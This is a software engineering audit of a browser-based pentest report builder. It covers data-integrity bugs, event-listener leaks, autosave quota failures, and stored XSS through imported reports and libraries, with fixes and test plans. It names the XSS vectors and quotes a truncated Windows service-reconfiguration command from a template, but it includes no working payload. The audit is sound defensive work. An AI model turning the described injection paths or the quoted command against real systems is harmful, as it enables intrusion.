# Rapportgenerator — Engineering Audit, Optimization & Competitive Analysis

**Audit date:** 2026-11-01  **Scope:** this repository (all files)  **Mode:** assessment only. No project files were modified.

**Evidence labels used throughout**
- **CONFIRMED (runtime):** reproduced in a real browser (headless Microsoft Edge 156, driven over the Chrome DevTools Protocol against `http://127.0.0.1:8080`). Test scripts are listed in [Verification Results](#verification-results).
- **CONFIRMED (code):** follows directly from the source with no ambiguity, but was not executed.
- **LIKELY / POTENTIAL:** reasoned from the code with an explicit uncertainty.

---

## Implementation Status

Work happens on the `audit-fixes` branch. Run `node tests/run.mjs` to check: every fixed finding has a regression case.

| Status | Findings |
|---|---|
| ✅ Done: step 0 (foundation) | ARCH-006, TEST-001, TEST-002, TEST-003 |
| ✅ Done: step 1 (critical) | BUG-001, BUG-010, BUG-015, BUG-002, BUG-003, BUG-011, BUG-012, ARCH-004, SEC-001, SEC-002, SEC-005 |
| ✅ Done: step 2 (reliability) | BUG-004, BUG-005, BUG-006, BUG-007, BUG-008, BUG-009, BUG-013, BUG-014, PERF-001, PERF-007, UI-009 |
| ✅ Done: step 3 (images and evidence) | PERF-003, PERF-005, PERF-006, FEAT-005 |
| ✅ Done: step 4 (usability) | UI-001, UI-002, UI-003, UI-004, UI-006, UI-008, PERF-008, SEC-004 |
| ✅ Done: step 5 (undo) | UI-005 |
| ✅ Done: step 6 (retests) | ARCH-003, FEAT-004, FEAT-008 |
| ✅ Done: later | UI-010 (found while adding the Swedish interface), FEAT-007 (report language: English/Swedish per report, with `lang` on the report for the spellchecker) |
| — Not selected | FEAT-001, FEAT-002, FEAT-003, FEAT-006, FEAT-009, FEAT-010, FEAT-011, FEAT-012, UI-007, PERF-002, PERF-004, SEC-003, SEC-006, ARCH-001, ARCH-002, ARCH-005, ARCH-007, TEST-004–007 |

**Decisions taken during implementation:**
- **BUG-007:** only *False Positive* is excluded from the matrix and the severity totals. Add `'Remediated'` to `STATUSES_EXCLUDED_FROM_RISK_TOTALS` to report outstanding risk only.
- **BUG-011:** the Findings Summary section can be moved but not deleted.
- **BUG-015:** the Add Finding form and the library are plain text and are escaped into finding HTML (option A).
- **ARCH-003:** findings carry a stable `id` (report format v3), but the inline handlers on finding cards still address findings by position. That's safe because every change re-renders the cards; moving fully to id-based handlers is part of ARCH-001.
- **FEAT-004:** a retest is started from the sidebar. Deleting the Retest Summary section ends it, and both can be undone.
- **UI-005:** the confirmation questions were kept, and undo is an additional safety net.
- **SEC-001:** the rich-text policy keeps the editor toolbar's output (bold, italic, strike, font size and color, alignment, quote, code, lists, h3/h4, links, images, tables). It never keeps `class`, layout CSS or event handlers.
- **SEC-DOM-2 (2026-11-08, DOM sink review):** every `innerHTML` / `insertAdjacentHTML` in `rapportgenerator.html` (28) was traced to its origin and carries a `// eslint-disable-next-line no-unsanitized/… -- reviewed: <why>` marker. Values are escaped (`escapeHtml`), integers, constants, sanitized (`sanitizeHtml`), or parsed only into an inert `<template>`. The sanitizer stays hand-written (option A): it parses into an inert `<template>`, removes every non-HTML-namespace node (`<svg>`, `<math>`) and script, style, template, frame, noscript and other raw-text or embedding elements with their content, unwraps other tags that aren't allowed (`<plaintext>` included, so its text stays text), allow-lists attributes, and allows `href`/`src` only by scheme prefix. Its output therefore contains only allow-listed HTML elements with escaped text, so re-parsing it can't turn text into markup (no mXSS). A corpus test (`SEC-DOM-2-corpus`) checks this in both policies. Two gaps were closed: finding description/remediation were rendered raw on every `renderAll()` and relied on every writer having sanitized them, but text committed from an editable field (`this.innerHTML`) never was. They are now sanitized at render. A failed import's rollback re-applied the live report unsanitized; it now goes through `sanitizeReportPayload()` like undo. Not changed: `buildReportPayload()` clones the live report container, which re-fires an image handler that is already on the page (a clone in the live document loads images). That needs a prior bypass to matter.

---

## Executive Summary

Rapportgenerator is a single-file, client-side pentest report builder: 2,906 lines of HTML, CSS and vanilla JS, plus three JSON data files. Its core proposition is that nothing leaves the browser and there is nothing to install. None of the six competitors reviewed offers that, so it is a real differentiator (COMP-007). The code is generally careful and well commented, and performance is currently fine. `renderAll()` takes **~27 ms with 150 findings** (measured).

The most important problems are **data-integrity bugs in the save/edit pipeline** and **HTML injection through imported files**:

1. **BUG-001 (P0): live tokens corrupt report text.** All 270 library templates contain `[CLIENT NAME]`. After a user clicks into and out of a finding description and then makes any other change, the text becomes `For Acme Corp">Acme Corp, …`. Reproduced end-to-end. It lands in the printed PDF.
2. **BUG-002 (P1): exported reports silently lose the assessment dates and classification** when those values were pre-filled from remembered settings. The loss is masked when re-importing in the same browser.
3. **BUG-003 (P1): import is not atomic.** A malformed or older JSON file destroyed 11 of 12 report sections before the error dialog appeared.
4. **BUG-005 (P1): autosave silently stops working** once a report exceeds ~5 M characters, which is easily reached with a few screenshots. A stale older draft is then offered on the next start.
5. **SEC-001 / SEC-002 (Medium–High): imported reports and imported libraries execute script.** Both were confirmed with an `onerror` payload. Pentest reports are routinely exchanged between colleagues and firms, so "only import files you trust" is a weak control.
6. **PERF-001 (P1): event listeners leak.** Every render permanently adds another `dragover` listener (1 → 51 after 50 renders), and every import duplicates container listeners.

The highest-value product opportunities, informed by SysReptor, PwnDoc, Ghostwriter, Dradis, PlexTrac and Faraday, are:
- a built-in **CVSS 3.1/4.0 calculator** (FEAT-001)
- **client-side scanner import** for Burp, Nessus and Nmap (FEAT-002)
- a **retest workflow** (FEAT-004)
- proper **evidence/screenshot handling** (FEAT-005)
- **encrypted report files** (FEAT-010)

All of these fit the no-backend model.

**Recommended first move:** put the project under git (ARCH-006). Then fix BUG-001, BUG-002, BUG-003, BUG-005, SEC-001 and SEC-002, and PERF-001 together with a minimal regression harness (TEST-001, TEST-002).

---

## Application Architecture

**Purpose and users:** pentesters and security consultants who write assessment reports and export them to PDF. Single user, single browser, no account.

**Technologies:** HTML5, CSS (386 lines), vanilla ES2020+ JS (1,861 lines, one `<script>`). Bootstrap 5.3.0 CSS and Bootstrap Icons 1.11.3 come from jsDelivr. There is no build step, package manifest or tests. Deployment is GitHub Pages (`jozeta.github.io/rapportgenerator`) or any static server. Under `file://` the JSON fetches fail and the app degrades with banners.

**Data files**

| File | Content |
|---|---|
| `library.json` (844 KB) | 270 templates, each with `{title, category, cwe, description, remediation}`. All CWE fields are `CWE-N`. All 270 contain `[CLIENT NAME]`, 7 contain HTML, and 7 titles are duplicates. |
| `report-defaults.json` (40 KB) | 7 assessment types × 9 section ids (`section-exec` … `section-conclusion`) |
| `settings.json` | Firm defaults. Non-empty identity fields lock and hide their sidebar inputs. |

**State model: two sources of truth**
- `findings[]` (JS array) is the model for finding cards. `renderAll()` (`rapportgenerator.html:2467`) regenerates the matrix, summary, severity table, cards, checklist and TOC from it.
- Narrative sections, metadata inputs and section order live only in the DOM. They are serialized via `innerHTML` (`buildReportPayload`, `:2792`).
- Globals: `currentLogo`, `tocEnabled`, `classifications`, `actionPlannersGloballyVisible`, `hasUnsavedChanges`, `library`, `reportTemplates`, `currentAssessmentType`.

**Startup (critical path):** `init()` (`:1415`) attaches listeners and renders synchronously. `loadExternalDefaults()` (`:1458`) then runs these steps sequentially:
1. `report-defaults.json`
2. `settings.json`
3. localStorage identity fields
4. `logo.png` / `logo.jpg` probe
5. `library.json`
6. the autosave restore prompt

**Persistence paths**
- Export or Import JSON: `buildReportPayload` / `applyReportPayload`.
- Autosave to `localStorage['rapportgen:autosave']`: every 20 s while dirty, plus on `beforeunload`.
- Per-field `localStorage` for client, company, contact, dates and classification.
- PDF via `window.print()` and a print stylesheet.

**Dynamic tokens:** `convertLiteralTokensToSpans()` (`:1531`) turns literal `[CLIENT NAME]` text into `<span class="token-client" data-placeholder="[CLIENT NAME]">`. `syncTokens()` (`:1558`) updates every span from the sidebar. This is the source of BUG-001.

**Most expensive operations (measured, see PERF):**
- `renderAll()` scales with findings: 7 ms at 10, 20 ms at 50, 27 ms at 150, and 47 ms at 150 with 4.5 MB of embedded images.
- Payload build and stringify: 2 ms at 150 findings, 7 ms with images.

**Most likely failure points:**
- token conversion on `innerHTML` strings
- DOM-attribute-based serialization of form state
- unvalidated import payloads
- `localStorage` quota
- listener registration inside functions that run repeatedly

**Where the implementation differs from what the README promises:**
- "Styled in-page confirmation and alert dialogs in place of the browser's native popups": asset add and edit still use native `prompt()` (UI-003).
- "Identity fields remembered … a new report opens pre-filled": true on screen, but those values are not carried into the export (BUG-002).
- Autosave is described as a crash safety net. It fails silently above ~5 M characters (BUG-005).
- "No internet connection required beyond the initial load": icons and layout depend on the CDN on every uncached load (PERF-008).

---

## Critical Findings

| ID | Pri | Title | Evidence |
|---|---|---|---|
| BUG-001 | P0 | Token re-conversion corrupts text in findings and sections | Runtime: `For Acme Corp">Acme Corp` |
| BUG-002 | P1 | Export drops remembered dates and classification | Runtime: `exportHasStartDate:false` |
| BUG-003 | P1 | Malformed import destroys the current report | Runtime: 12 → 1 sections |
| BUG-005 | P1 | Autosave fails silently above ~5 M chars | Runtime: 3 MB stored, 5 MB not |
| BUG-011 | P1 | Deleting Findings Summary makes every later render throw | Runtime: `TypeError` in `createMatrix` |
| SEC-001 | P1 | Stored XSS via imported report JSON | Runtime: `onerror` executed |
| SEC-002 | P1 | Stored XSS via imported library | Runtime: `onerror` executed |
| PERF-001 | P1 | Event-listener leak on every render and import | Runtime: 1 → 51 listeners |

---

## Functional Bug Report

### [BUG-001] [P0] Live-token conversion re-runs on already-converted HTML and corrupts visible text

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `rapportgenerator.html`, specifically:
- `convertLiteralTokensToSpans()` (`:1531–1556`)
- its callers: `setupDynamicTokenParsers()` focusout (`:1521`), `renderAll()` (`:2713`) and `applyAssessmentTemplate()`

**Problem:** The function does `html.replaceAll('[CLIENT NAME]', '<span … data-placeholder="[CLIENT NAME]">…</span>')` on the raw `innerHTML` string. The spans it creates contain the literal `[CLIENT NAME]` in their `data-placeholder` attribute. Any later pass therefore matches inside the attribute and injects a span into the attribute value. The browser then parses the result into stray visible text.

**Evidence (`t3.js`, `t4.js`):**
- Two conversions of `Thanks to [CLIENT NAME].` produce the visible text `Thanks to [CLIENT NAME]">[CLIENT NAME].`
- Real user flow:
  1. Set Client Name to "Acme Corp".
  2. `loadTemplate(0)`, then `addFinding()`.
  3. Blur the description.
  4. Change the Impact score.

  The description then reads `Business Impact: For Acme Corp">Acme Corp, a database compromised…`.
- `library.json`: **270 / 270 templates** contain `[CLIENT NAME]`.

**Root cause:** String-level replacement over serialized HTML, including attribute text. The code relies on idempotence that the function doesn't have. `renderAll()` re-runs it on every finding field on every render, and finding fields are re-saved from `innerHTML` on every blur (`onblur="updateFindingData(…, this.innerHTML)"`), so the corruption is reached in normal use.

**Impact:**
- Garbage text in client-facing PDFs.
- Corrupted data is persisted into exports and autosaves.
- It affects essentially every library-based finding the user touches.
- It also affects narrative sections where a user typed a placeholder, from the second focusout onward.

**Recommendation:** Convert by walking **text nodes only**, skipping nodes already inside a token span. Build the spans with DOM APIs (`textContent`), not string concatenation. Add a repair step on import and restore that unwraps the corrupted pattern.

**Implementation approach:**
1. Use a `TreeWalker(SHOW_TEXT)`. For each text node not inside `.token-*`, split on `/\[(CLIENT NAME|COMPANY NAME|CONTACT NAME|CONTACT EMAIL)\]/`. Replace each match with `document.createElement('span')` plus `className`, `dataset.placeholder` and `textContent`.
2. Only touch the DOM when a match exists. This preserves the caret and undo history.
3. Repair on import: for each `[data-placeholder]` element whose attribute isn't one of the four literals, reset the attribute and remove the adjacent stray `">…` text node. Alternatively, re-derive tokens from the stored placeholder.

**Validation:** TEST-002 / TEST-003 cases:
- Convert ×3 is idempotent (identical `innerHTML`).
- Run the user flow above and assert that `innerText` contains no `">`.
- Repaired legacy payload snapshot.

**Complexity:** Small **Dependencies:** none. Fix together with BUG-010, which is the same function.

---

### [BUG-002] [P1] Exported report omits assessment dates and classification restored from localStorage

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:**
- `loadPersistedFields()` (`:1240`)
- `setupStateLockListeners()` (`:1505`)
- `renderClassificationSelect()` (`:2362`)
- `buildReportPayload()` (`:2792`)
- `applyReportPayload()` (`:2824–2827`)

**Problem:** Form state is exported only through HTML attributes, which are copied from properties on user `change` events. Values set programmatically (startup restore from localStorage) set `.value` only. `renderClassificationSelect()` hard-codes `selected` on the placeholder option and sets only the property.

**Evidence (`t2.js` T4):** after `loadPersistedFields()`, the UI shows `2026-10-01` / `Confidential`, but the export has `exportHasStartDate:false` and `exportHasClassificationSelected:false`.

**Root cause:** Using DOM attributes as the persistence mechanism for form state (see ARCH-002).

**Impact:** A report delivered as JSON to a colleague, or reopened on another machine, has blank dates and no classification. The watermark in classification mode also disappears. In the author's own browser the import keeps the local values (`applyReportPayload` only overrides when the attribute exists), so **the author never sees the loss**.

**Recommendation:** Serialize metadata explicitly in the payload as `meta: {startDate, endDate, classification, showMetaBg}` and restore it explicitly. Keep the attribute sync only as a fallback for old files.

**Implementation approach:**
1. Add the fields in `buildReportPayload`.
2. Read them in `applyReportPayload` (fall back to the attributes for old files).
3. Bump `schemaVersion` (ARCH-004).

**Validation:** TEST-002 round-trip in a fresh profile: dates and classification are preserved even when never edited in the session.

**Complexity:** Small **Dependencies:** ARCH-004 (recommended, not required)

---

### [BUG-003] [P1] Report import is not atomic: a malformed or older file wipes the current report, then fails

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:**
- `applyReportPayload()` (`:2818`)
- `createMatrix()` (`:2767`, see BUG-011)
- `importReportJson()` (`:2870`)

**Problem:** The function replaces `#reportBlocksContainer.innerHTML` and assigns `findings` *before* any validation. Then `renderAll()` / `createMatrix()` throw.

**Evidence (`t2.js` T7):** with `{blocksHtml:'<div class="report-block"><h2>x</h2></div>', findings:{}}`, the section count went from 12 to 1, `findings` became an object, and it threw `TypeError: Cannot set properties of null (setting 'innerHTML')`. The user then sees "Import failed…" with the report already destroyed. The same happens to the autosave restore path.

**Root cause:** No schema validation and no transactional apply.

**Impact:** Unrecoverable loss of unsaved work. The user had already confirmed "this cannot be undone", but they expected a *replacement*, not destruction followed by failure.

**Recommendation:** Validate first, then snapshot, then apply, and roll back on exception.

**Implementation approach:**
1. `validateReportPayload(data)` checks types (`Array.isArray(findings)`, each finding object, string fields) and that `blocksHtml` contains `#matrix` and at least one `.details-block`.
2. `const backup = buildReportPayload()`.
3. `try { apply } catch { applyReportPayload(backup) }`.

**Validation:** TEST-003 malformed-payload matrix. The report must be unchanged after each failing import.

**Complexity:** Small–Medium **Dependencies:** ARCH-004

---

### [BUG-004] [P2] Export does not clear the autosave snapshot, so the next session offers a stale "unsaved" draft

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `exportReportJson()` (`:2864`), `maybeRestoreAutosaveDraft()` (`:1279`)

**Problem / Evidence (`t2.js` T13):** after export, `hasUnsavedAfterExport:false` but `autosaveStillPresent:true`. On the next visit the prompt says the draft exists "because a previous session ended without exporting", which is false. The draft can be up to 20 s older than the exported file.

**Root cause:** `clearAutosave()` is only called on New Report and on discard.

**Impact:** Confusing prompt. A user may restore an older state, or discard a draft that was actually newer after further edits.

**Recommendation:** Call `clearAutosave()` after a successful export (or store the `exportedAt` timestamp and word the prompt accordingly). Also clear it after a successful import.

**Validation:** Export, then reload: no prompt appears.

**Complexity:** Small **Dependencies:** none

---

### [BUG-005] [P1] Autosave fails silently once the report exceeds ~5 M characters, leaving an older snapshot to be restored

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `autosaveReport()` (`:1262`). Images inserted by `insertImageFromToolbar()` (`:1892`) and the logo are stored as base64.

**Problem / Evidence (`t3.js` T9):** a snapshot with a 3 MB image is stored. With 5, 7 or 9 MB images it is **not stored**, and the `catch {}` swallows `QuotaExceededError`.

**Root cause:** `localStorage` has a per-origin quota of roughly 5 M UTF-16 characters in Chromium. Pentest reports with screenshots exceed it quickly.

**Impact:** The README's crash-recovery promise does not hold for typical evidence-heavy reports. Worse, the previous smaller snapshot stays and is offered as "the" draft.

**Recommendation:**
1. Move the autosave to **IndexedDB**, whose quota is far larger and which can store Blobs.
2. On failure, surface a visible "Autosave failed — export now" status (UI-009).
3. Remove the stale snapshot when a save fails.

**Validation:** Autosave and restore of a 20 MB report succeeds. A forced failure shows a banner.

**Complexity:** Medium **Dependencies:** PERF-003 (image store) synergizes

---

### [BUG-006] [P2] Library search throws when any library entry lacks `title` or `cwe`, blanking the whole result list

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `filterLibrary()` (`:2129–2133`), `importLibraryJson()` (`:2193`)

**Evidence (`t2.js` T5):** entry `{title, category, description, remediation}` (no `cwe`) with search term "sql" throws `TypeError: Cannot read properties of undefined (reading 'toLowerCase')`, and 0 results are shown. With an empty term it works by accident, because `||` short-circuits.

**Root cause:** No per-entry validation on import, and no defensive access.

**Impact:** A custom firm library with one incomplete entry makes search unusable.

**Recommendation:** Normalize entries on load and import (`String(v.title ?? '')`, etc.), and reject or report invalid ones with a count.

**Validation:** TEST-005 library lint, plus a unit check with partial entries.

**Complexity:** Small **Dependencies:** SEC-002 (same render path)

---

### [BUG-007] [P2] False-positive (and remediated) findings are counted in the severity table and plotted on the risk matrix

**Category:** Bug (business logic) **Confidence:** High (CONFIRMED runtime). Medium confidence that this is unintended.

**Affected files:** `renderAll()` (`:2539–2554`)

**Evidence (`t1.js` T12):** one finding scored 5×5 with status "False Positive" gives Critical count = 1 and 1 dot on the matrix.

**Root cause:** Counts ignore `status`.

**Impact:** Executive summary numbers overstate risk after triage or retest. The client-facing headline numbers are wrong.

**Recommendation:**
- Exclude `False Positive` from counts and the matrix by default.
- Optionally show "Remediated" separately: add a status column, or a toggle "Count remediated findings".
- Mark excluded findings in the summary list.

**Validation:** The severity table and matrix update correctly when the status changes.

**Complexity:** Small **Dependencies:** pairs with FEAT-004

---

### [BUG-008] [P2] Find & Replace interprets `$&`, `$1`, `` $` ``, `$'` and `$$` in the replacement text

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `replaceTextNodesInElement()` (`:1713`), `replacePlainText` (`:1729`)

**Evidence (`t1.js` T3):** replacing `X` with `US$&` in "Price X" gives **"Price USX"** (expected "Price US$&"). Replacing with `$$` collapses to `$`.

**Root cause:** `String.prototype.replace` with a string replacement applies special patterns.

**Impact:** Currency amounts and code snippets get altered silently, and the reported count still says success.

**Recommendation:** Use a function replacement: `.replace(pattern, () => replaceText)`.

**Validation:** Unit test with `$&`, `$1` and `$$`.

**Complexity:** Small **Dependencies:** none

---

### [BUG-009] [P3] Editing a finding title strips a leading number when the user removed the "N. " prefix

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:** `updateFindingData()` (`:2759`). The title `<h3>` at `:2644` contains `${id}. ${title}` inside the editable element.

**Evidence (`t1.js` T8):** the title saved as `802.1X not enforced` becomes **`1X not enforced`**.

**Root cause:** The display number is part of the editable text and is removed with `/^\d+\.\s*/`.

**Impact:** Titles starting with versions or standards (802.1X, 3DES, 2FA…) get mangled.

**Recommendation:** Render the number in a separate non-editable `<span>` outside the `contenteditable`, and drop the regex.

**Validation:** Titles such as `802.1X…` and `3. Something` round-trip unchanged.

**Complexity:** Small **Dependencies:** none

---

### [BUG-010] [P2] Client/company/contact values are inserted as raw HTML when tokens are created

**Category:** Bug (+ minor injection) **Confidence:** High (CONFIRMED runtime)

**Affected files:** `convertLiteralTokensToSpans()` (`:1532–1550`)

**Evidence (`t1.js` T10):** client name `Smith <b>Bros</b> & Co` creates a real `<b>` element in the report. `syncTokens()` uses `innerText`, so the same text renders differently depending on the code path.

**Impact:** Names containing `<`, `>` or `&` render inconsistently. Values coming from `settings.json` or an imported report are also an HTML-injection path (see SEC-001).

**Recommendation:** This is fixed by the DOM-based rewrite in BUG-001 (`textContent`).

**Complexity:** Small **Dependencies:** BUG-001

---

### [BUG-011] [P1] Deleting the Findings Summary section breaks the app: every later render throws

**Category:** Bug **Confidence:** High (CONFIRMED runtime)

**Affected files:**
- `createMatrix()` (`:2768`): `m.innerHTML = ''` runs before `if (m)`
- `removeSection()` (`:1922`): only the last `.details-block` is protected

**Evidence:**
- `t3.js` T16: with `#matrix` absent, `createMatrix()` throws `TypeError: Cannot set properties of null`. This is also the crash that leaves BUG-003 imports half-applied.
- `t7.js`: clicking the trash icon on **Findings Summary** (`#block-summary`, which holds `#matrix`) and confirming throws immediately inside `removeSection → renderAll → createMatrix (:2768)`. From then on, adding, scoring, re-ordering or deleting findings all throw, because each one calls `renderAll()`.

**Impact:** One ordinary click on a visible trash icon breaks the core of the app until the page is reloaded, and the report state may be lost. There is no warning in the confirm dialog.

**Recommendation:**
- Move the guard first.
- Make `renderAll()` tolerate a missing matrix or severity table.
- Either prevent deleting the Findings Summary block, or support it.

**Validation:** Delete the Findings Summary section, add a finding, and confirm there are no errors.

**Complexity:** Small **Dependencies:** none

---

### [BUG-012] [P3] Global Action-Planner visibility is neither exported nor restored

**Category:** Bug **Confidence:** High (CONFIRMED code; runtime shows the payload lacks the key)

**Affected files:** `buildReportPayload()` (`:2810`), `applyReportPayload()`, `toggleAllActionPlanners()` (`:1469`)

**Problem:** After import, `actionPlannersGloballyVisible` keeps its in-memory value (usually `false`) while findings carry `showPlanner:true`. The sidebar icon then shows the opposite state, and the first click appears to do nothing.

**Recommendation:** Add the flag to the payload, restore it, and call `updateActionPlannerToggleIcon()`.

**Complexity:** Small **Dependencies:** ARCH-004

---

### [BUG-013] [P3] In-progress edits inside a focused finding field are not captured by autosave

**Category:** Bug **Confidence:** Medium (CONFIRMED code, not reproduced as a crash scenario)

**Affected files:** `autosaveReport()` and the finding `onblur` handlers (`:2644`, `:2682`, `:2687`)

**Problem:** Finding title, description and remediation are written to `findings[]` only on blur. The 20 s interval and the `beforeunload` autosave serialize `findings[]`, so text typed into a still-focused finding field is missing from the snapshot. Narrative sections are unaffected because they are DOM-based.

**Recommendation:** Commit on `input` with a debounce (~300 ms) instead of only on blur, or flush the active element before each autosave.

**Validation:** Type in a description, trigger `autosaveReport()` without blurring, and confirm the snapshot contains the text.

**Complexity:** Small **Dependencies:** BUG-001 (re-render while typing must not reset the caret)

---

### [BUG-014] [P3] Library data quality: 7 duplicate template titles

**Category:** Bug (data) **Confidence:** High (CONFIRMED by script)

**Affected files:** `library.json`. Duplicate titles:
- weak password policy
- missing rate limiting
- insecure deserialization
- missing network access control
- missing encryption in transit
- default credentials in use
- privileged containers allowed

**Impact:** Users can't tell the variants apart in search results, because only title, category and CWE are shown.

**Recommendation:** Disambiguate titles by platform (e.g. "Weak Password Policy (Active Directory)"). Add TEST-005 linting.

**Complexity:** Small **Dependencies:** none

---

### [BUG-015] [P2] Library prose with angle brackets is parsed as HTML: text disappears, and `<iframe>` swallows the rest of a description

*(Found 2026-11-01 while fixing BUG-001.)*

**Category:** Bug (data + rendering model) **Confidence:** High (CONFIRMED by script; the effect follows from HTML parsing rules)

**Affected files:**
- `library.json`: 8 fields in 7 templates
  - #20 "Missing X-Frame-Options Header": `<iframe>`
  - #122 IMDSv1: `<role-name>`
  - #143 Insecure Service Permissions: `<name>`, `<group>`
  - #144 Unquoted Service Path: `<name>`
  - #180 Anonymous API Access: `<endpoint>`
  - #181 Excessive RBAC Permissions: `<identity>`
  - #223 Secrets in VCS History: `<commit>`
- `addFinding()` (`rapportgenerator.html`): the `<textarea>` values are stored as finding HTML

**Problem:** The library text and the Add Finding textareas are plain text, but finding descriptions and remediations are rendered as HTML. So `sc config <name> binPath=…` shows up as `sc config  binPath=…`, because `<name>` becomes an empty unknown element. In #20, everything after `<iframe>` becomes invisible iframe content and disappears from the report, including the client-name sentence.

**Root cause:** No conversion step between the plain-text model (library, form) and the HTML model (finding cards).

**Impact:** The command examples consultants rely on are silently missing from the client deliverable.

**Recommendation:** Convert form text to HTML in `addFinding()` by escaping it (`escapeHtml`; newlines already render because `.editable-section` uses `white-space: pre-wrap`). Keep `library.json` as plain text. The 7 templates that already contain intentional HTML among the 270 should be reviewed: only `< and >` in #42 looks deliberate, and it is not a tag.

**Validation:** `BUG-001-library` already checks idempotence. Remove its BUG-015 skip and require exact text for all 540 fields.

**Complexity:** Small **Dependencies:** SEC-001 (both define what HTML a finding may contain)

---

## Performance Report

**Measurements** (headless Edge 156 on this Mac; averages of 5 runs; synthetic findings built from real library templates):

| Findings | `renderAll()` | `renderChecklist()` | payload build + stringify | payload size |
|---|---|---|---|---|
| 10 | 7.2 ms | <0.1 ms | 1.0 ms | 73 KB |
| 50 | 20.0 ms | 0.1 ms | 1.7 ms | 214 KB |
| 150 | 27.3 ms | 0.1 ms | 2.0 ms | 546 KB |
| 150 + 3×1.5 MB images | 47.4 ms | — | 6.9 ms | 4.6 MB |

**Conclusion:** raw rendering speed is **not** a current bottleneck. A full rebuild at realistic sizes stays well under the ~200 ms INP "good" threshold. The real performance problems are **unbounded growth** (PERF-001) and **image weight** (PERF-003). I did not measure LCP, INP or CLS with field tooling; PERF-008 lists what to measure.

### [PERF-001] [P1] Event listeners accumulate on every render and every import (memory and drag latency grow without bound)

**Category:** Performance **Confidence:** High (CONFIRMED runtime: listener counts)

**Affected files:**
- `setupVulnDragAndDrop()` (`:2104–2112`, called from `renderAll()` `:2738`)
- `setupDragAndDrop()` (`:2025`, called from `addNewSection`, `addNewDetailsSection`, `insertPageBreakAfter` and `applyReportPayload`)
- `setupStateLockListeners()` (`:1505`, re-called from `applyReportPayload` `:2822`)

**Evidence:**
- `dragover` listeners on `.findings-container` went from 1 to **51** after 50 `renderAll()` calls (`t2.js` T2).
- After 3 imports, `change` listeners on `#reportBlocksContainer` went from 2 to **5**, `dragover` from 1 to 4, and a single date change ran `renderChecklist()` **4×** (`t3.js` T15).
- Each section-add re-attaches `mousedown`, `dragstart` and `dragend` to *every existing* block, so one section `dragend` then triggers `renderAll()` multiple times (CONFIRMED code).

**Root cause:** Listeners are attached inside functions that run repeatedly, to elements that persist (containers) or are already wired (existing blocks).

**Impact:**
- Each `dragover` event (fires continuously while dragging) runs N handlers, and each calls `getBoundingClientRect()` on every card. Cost is O(renders × cards) per pointer move, and renders happen on every score, status or title change.
- Memory grows for the session lifetime.
- I measured listener counts, **not** drag frame time. The latency impact is inferred.

**Recommendation:** Register all drag/drop and change handling **once** at init via event delegation on `#reportBlocksContainer` (`e.target.closest('.vuln-card')`, `.closest('.report-block')`).

**Implementation approach:**
1. Create one `setupDelegatedDnD()` called from `init()`.
2. Remove the per-element `addEventListener` calls.
3. Guard `setupStateLockListeners` with a module-level flag.
4. Keep `getDragAfter*` but throttle to `requestAnimationFrame`.

**Validation:** TEST-004: listener counts stay constant across 100 renders and 5 imports. Drag a card in a 150-finding report after 200 edits; Performance panel frames should stay under 16 ms.

**Complexity:** Small–Medium **Dependencies:** none

---

### [PERF-002] [P3] `library.json` (844 KB) is fetched and parsed on every page load even if the library is never opened

**Category:** Performance **Confidence:** High (CONFIRMED code). Impact not measured.

**Affected files:** `loadLibrary()` (`:1401`), called from `loadExternalDefaults()`

**Recommendation:** Load it on first `openAddFindingModal()`, keeping a prefetch on idle (`requestIdleCallback`). Serve with caching headers or a content hash on Pages.

**Expected benefit:** Less startup network and parse work, which matters most on slow links and `file://` fallbacks. It is not on the render-critical path today, so the benefit is modest.

**Validation:** Network panel shows no library request until the modal opens. The modal shows a loading state.

**Complexity:** Small **Dependencies:** none

---

### [PERF-003] [P2] Screenshots and logo are stored as inline base64 strings inside finding HTML

**Category:** Performance **Confidence:** High (CONFIRMED runtime: render 27 → 47 ms, payload 0.5 → 4.6 MB)

**Affected files:** `insertImageFromToolbar()` (`:1892`), `toBase64` (`:2780`), `renderAll()`, `autosaveReport()`, `buildReportPayload()`

**Root cause:** Images are part of the HTML strings, so they are re-parsed on every `renderAll()` and re-serialized every 20 s by autosave. They are also uploaded at full camera or Retina resolution with no downscaling.

**Impact:**
- Slower renders and autosave jank as evidence grows.
- Triggers BUG-005 (quota).
- Large JSON exports.

**Recommendation:**
1. On insert, downscale to a max width (e.g. 1600 px) and re-encode (JPEG/WebP ~0.85, keeping PNG for small or line-art images) using a canvas.
2. Store images in an `images` map `{id: dataUrl}` in the payload, with `<img data-img-id>` in the HTML. Hydrate `src` at render time, or keep Blobs in IndexedDB with object URLs.

**Trade-offs:** Lossy compression may blur text in screenshots, so offer a "keep original" option.

**Validation:**
- Insert a 4 MB Retina screenshot and confirm the stored size is under ~600 KB.
- `renderAll` time stays independent of image count.

**Complexity:** Medium **Dependencies:** BUG-005, FEAT-005

---

### [PERF-004] [P3] Every change triggers a full rebuild of all finding cards, plus duplicated work

**Category:** Performance **Confidence:** High (CONFIRMED runtime: `renderChecklist` called 2× per `renderAll`)

**Affected files:**
- `renderAll()` (`:2467`)
- `syncTokens()` → `renderChecklist()` (`:1568`), then `renderAll()` → `renderChecklist()` (`:2740`)
- `createMatrix()` rebuilt each time

**Problem:**
- A status or score change rebuilds all N cards as HTML strings, re-runs token conversion on every field, and destroys focus and selection.
- Cost is currently acceptable (27 ms at 150 findings).
- The bigger cost is UX: losing focus and scroll context.

**Recommendation:**
- Low priority for speed.
- Do targeted updates for score, status and planner (update one card plus the matrix and counts).
- Call `renderChecklist` once.
- Only revisit if TEST-004's budget is exceeded.

**Complexity:** Medium **Dependencies:** ARCH-003 (stable ids)

---

### [PERF-005] [P3] Object URLs created for downloads are never revoked

**Category:** Performance **Confidence:** High (CONFIRMED code: 3× `createObjectURL`, 0× `revokeObjectURL`)

**Affected files:** `exportReportJson()` (`:2866`), `exportLibraryJson()` (`:2178`), `saveSettingsJson()` (`:1396`)

**Impact:** Each export pins a Blob the size of the report (MBs with images) until the tab closes.

